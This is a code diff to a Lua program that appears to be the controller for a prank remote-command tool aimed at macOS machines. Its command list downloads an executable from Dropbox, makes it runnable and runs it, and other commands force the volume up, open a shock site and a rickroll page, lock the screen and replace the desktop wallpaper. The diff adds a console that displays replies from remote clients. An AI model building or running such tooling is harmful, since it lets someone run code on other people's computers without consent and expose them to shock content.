@@ -66,15 +66,16 @@ function love.load()
     tab = {}
 
     cmds = {
-        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://rickrolled.fr/'",
-        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://meatspin.fr/'",
+        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://rickrolled.fr/' && echo rickroll",
+        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome' 'http://meatspin.fr/' && echo meatspin",
         "'/System/Library/CoreServices/Menu Extras/User.menu/Contents/Resources/CGSession' -suspend",
-        "osascript -e 'set Volume 10' && say Hello",
-        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10' && afplay /tmp/darude.mp3 &",
-        "/tmp/audio -s 'Built-in Output'  && osascript -e 'set Volume 10'",
-        "curl -s 'https://dl.dropboxusercontent.com/u/22561204/AudioSwitcher' > /tmp/audio && chmod +x /tmp/audio",
-        "curl -s 'http://instantsandstorm.com/sandstorm.mp3' > /tmp/darude.mp3",
-        "echo echo"
+        "osascript -e 'set Volume 10' && say Hello && echo hello",
+        "/tmp/audio -s 'Built-in Output' && osascript -e 'set Volume 10' && afplay /tmp/darude.mp3 && play darude",
+        "/tmp/audio -s 'Built-in Output' && osascript -e 'set Volume 10' echo HP",
+        "curl -s 'https://dl.dropboxusercontent.com/u/22561204/AudioSwitcher' > /tmp/audio && chmod +x /tmp/audio && echo dl audio",
+        "curl -s 'http://instantsandstorm.com/sandstorm.mp3' > /tmp/darude.mp3 && echo dl darude",
+        "echo echo",
+        "curl -s https://dl.dropboxusercontent.com/u/22561204/wallpaper.png > ~/wall.png && osascript -e 'tell application 'Finder' to set desktop picture to POSIX file '~/wall.png' && echo Wall";
         }
 
     cmds_name = {
@@ -86,8 +87,11 @@ function love.load()
         "hp",
         "dl audio",
         "dl darude",
-        "echo"
+        "echo",
+        "Wall"
     }
+
+    console = ""
 
     mode = 0;
     r,g,b = 0,0, 255
@@ -120,6 +124,11 @@ function love.update(dt)
                 end
             else
                 print(data)
+                if data:sub(0,8) == "jso:dat:" then
+                    --print(data:sub(9))
+                    tmp = json.decode(data:sub(9))
+                    console = console.."\n"..tmp.client.login..": "..tmp.data
+                end
             end
         end
         i = 0
@@ -135,6 +144,7 @@ function love.draw()
     love.graphics.setColor( 255, 255, 255, 255)
     love.graphics.print(mode % #cmds, 160 * 7 + 5, 190*3 + 5)
     love.graphics.print(cmds_name[mode % #cmds + 1], 160 * 7 + 5, 190*3 + 20)
+    love.graphics.print(console, 1000, 10)
 
 
 end
